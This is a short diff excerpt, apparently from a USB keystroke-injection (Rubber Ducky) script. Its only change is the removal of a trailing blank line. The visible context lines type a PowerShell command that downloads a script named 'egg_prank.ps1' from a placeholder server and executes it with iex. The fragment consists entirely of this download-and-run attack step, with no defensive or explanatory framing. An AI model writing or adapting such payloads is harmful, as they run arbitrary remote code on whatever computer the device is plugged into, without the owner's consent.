@@ -6,4 +6,3 @@ ENTER
 DELAY 300
 STRING iex ((New-Object System.Net.WebClient).DownloadString('http://YOURSERVER/egg_prank.ps1'))
 ENTER
-
